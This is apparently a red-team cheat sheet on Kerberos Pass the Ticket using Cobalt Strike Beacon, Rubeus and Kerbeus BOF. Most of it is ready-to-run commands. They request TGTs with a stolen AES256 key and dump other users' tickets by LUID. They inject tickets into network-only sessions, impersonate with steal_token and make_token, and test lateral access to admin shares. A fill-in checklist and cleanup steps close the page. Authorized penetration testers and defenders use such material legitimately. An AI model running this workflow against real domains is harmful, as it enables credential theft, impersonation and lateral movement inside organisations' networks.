---
title: "Pass the Ticket with Cobalt Strike"
description: "Request or extract a Kerberos TGT, import it into a separate logon session with Rubeus or Beacon, and verify the selected ticket cache."
category: "User Impersonation"
tools: ["Cobalt Strike", "Rubeus", "Kerbeus BOF", "PowerShell"]
updated: "2026-11-10"
tags: ["impersonation", "pass-the-ticket", "kerberos", "rubeus", "lateral-movement"]
draft: false
---

## 1. Tickets, sessions and tokens

Pass the Ticket uses an available Kerberos ticket for authentication as its client identity. The notes cover requesting or extracting TGTs and importing them into a selected session; ticket forging is outside this guide.

Each Windows logon session has a LUID and an associated credential cache. A token's Authentication ID connects it to that session. Importing a ticket changes a session's cache; selecting a token determines which session the current Beacon uses for the relevant operations.

| Operation | What it does | What it does not do |
|---|---|---|
| `asktgt` | Requests a TGT from the KDC using an account key | Does not automatically select its session in these examples |
| `triage` / `dump` | Enumerates or extracts existing tickets | Does not request a new TGT |
| `createnetonly` | Creates a process and a network-only logon session | Does not by itself import a ticket in the command below |
| `ptt` / `kerberos_ticket_use` | Imports a ticket into a session cache | Does not create a process by itself |
| `steal_token` | Selects a process token for impersonation | Does not recover a password |
| `kerberos_ticket_purge` | Clears tickets from the selected session | Does not end token impersonation |
| `rev2self` | Ends current impersonation | Does not itself purge tickets |

Importing a TGT into a session that already has one can replace existing material. A separate network-only test session limits interference with the original user's cache. It still creates observable activity.

## 2. Obtain a TGT: request or extract

Choose one source. Requesting a TGT requires a valid account key and connectivity to the KDC. The example uses AES256. RC4/NTLM-based requests depend on domain policy and supported encryption; they are not a universal substitute.

```shell
# Request a TGT with the example account's AES256 key
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
# Expected on success: base64(ticket.kirbi), client rsteel, service krbtgt/CONTOSO.COM
```

Alternatively, inspect an existing session. Access to tickets from other users' LUIDs requires an elevated context with sufficient permissions.

```shell
# Identify the correct user, service and LUID
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# Extract the selected session's TGT
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap

# BOF alternative, after loading Kerbeus-BOF
krb_triage
krb_dump /user:rsteel /service:krbtgt
```

Retain the complete ticket. `[...snip...]` output is illustrative and cannot be imported. Keep the same client identity throughout the workflow. See [Kerberos credential access](/cheatsheets/kerberos-credential-access-cheatsheet/) for extraction and lifetime details.

## 3. Rubeus: create a session, import and select

`createnetonly` returns both a process PID and a logon LUID. They identify different objects: `ptt /luid` selects the session, while `steal_token` selects the process. Access to another LUID and its process token requires sufficient privileges.

```shell
# Create the separate network-only process and record the returned PID and LUID
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass
# Example: PID 2524 and LUID 0x132ef34; substitute actual returned values

# Import the complete ticket into that session
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:<CREATED_LUID> /ticket:<BASE64_TICKET>

# Select its process token in the current Beacon
steal_token <CREATED_PID>
```

The source notes also describe adding `/ticket:<BASE64_TICKET>` to `createnetonly` to combine creation and import; check support in the installed Rubeus version. `ptt` alone does not create a session.

`FakePass` is a placeholder for creating the network-only context, not a discovered valid password. The imported ticket supplies Kerberos authentication. The local token identity can remain the original user even when the ticket client is `rsteel`.

## 4. Beacon alternative: convert and import

First convert the complete Base64 ticket to a `.kirbi` file in **PowerShell on the operator's machine**.

```powershell
$ticket = '<BASE64_TICKET>'
[IO.File]::WriteAllBytes('C:\Users\Attacker\Desktop\rsteel.kirbi', [Convert]::FromBase64String($ticket))
# Successful conversion creates the file without printing output
```

Then create the network-only context and import the file from **Beacon**. This is an alternative to the Rubeus session workflow.

```shell
make_token CONTOSO\rsteel FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
```

The ticket file path is on the operator's machine. Confirm that the import affected the intended session rather than assuming the UI label proves success.

## 5. Verify the selected cache and remote access

```shell
# Inspect tickets after selecting the intended session
run klist
# Check Current LogonId against the intended session
# Expected client: rsteel @ CONTOSO.COM
# Expected TGT service: krbtgt/CONTOSO.COM

# Test the actual resource using its hostname
ls \\lon-ws-1\c$
```

Review ticket client, service and expiration. Ticket presence proves cache state, not authorization to every resource. Using a hostname consistent with the intended service SPN matters for Kerberos authentication; a share listing alone does not prove which authentication protocol was negotiated.

## 6. Cleanup in the correct order

Purge only the selected test session while it is still selected. Then end impersonation. Terminate the test process only if this workflow created one.

```shell
# Confirm that the intended test session is selected before purging
run klist
kerberos_ticket_purge

# Return to the original Beacon context
rev2self

# Rubeus createnetonly path only: terminate the process created for this exercise
kill <CREATED_PID>

getuid
```

Purging a real user's session can disrupt access. `rev2self` and token purging perform different actions; neither removes generated telemetry.

## 7. Troubleshooting

| Symptom | What to check |
|---|---|
| TGT request fails | Account key, domain, KDC reachability, encryption policy and clock |
| Base64 conversion fails | Complete unmodified ticket, without abbreviated output |
| Import into another LUID fails | Actual LUID, session existence and sufficient privileges |
| UI shows the original local user | Network-only context; inspect the ticket client with `klist` |
| Ticket imported but resource denied | Selected session, SPN, validity and remote authorization |
| Tickets disappear from the wrong session | Confirm `Current LogonId` before import or purge |

## 8. Quick checklist

Run Beacon commands in Beacon; perform the `.kirbi` conversion locally in PowerShell. Choose one acquisition method and one session/import method.

```text
ACQUIRE — REQUEST OR EXTRACT
[ ] execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN_FQDN> /aes256:<AES256_KEY> /nowrap
[ ] Extraction alternative: execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
[ ] execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<SOURCE_LUID> /service:krbtgt /nowrap
[ ] BOF alternative: krb_triage, then krb_dump /user:<USER> /service:krbtgt
[ ] Retain the complete ticket and confirm its client and expiration

RUBEUS SESSION PATH
[ ] execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:<USER> /domain:<DOMAIN_FQDN> /password:FakePass
[ ] Record CREATED_PID and CREATED_LUID separately
[ ] execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:<CREATED_LUID> /ticket:<BASE64_TICKET>
[ ] steal_token <CREATED_PID>

BEACON SESSION ALTERNATIVE
[ ] Local PowerShell: $ticket = '<BASE64_TICKET>'
[ ] Local PowerShell: [IO.File]::WriteAllBytes('C:\path\user.kirbi', [Convert]::FromBase64String($ticket))
[ ] Beacon: make_token <DOMAIN>\<USER> FakePass
[ ] Beacon: kerberos_ticket_use C:\path\user.kirbi

VERIFY AND CLEAN UP
[ ] run klist → verify Current LogonId, client, service and validity
[ ] ls \\<HOST_FQDN>\<SHARE> → verify access to the intended resource
[ ] run klist → confirm the test session before purging
[ ] kerberos_ticket_purge → clear only the selected test cache
[ ] rev2self → end impersonation
[ ] kill <CREATED_PID> → only if this workflow created that process
[ ] getuid → confirm the original Beacon context
```

## Related references

- [Token impersonation](/cheatsheets/token-impersonation-cobalt-cheatsheet/)
- [Pass the Hash](/cheatsheets/pass-the-hash-cobalt-cheatsheet/)
- [Process injection](/cheatsheets/process-injection-cobalt-cheatsheet/)
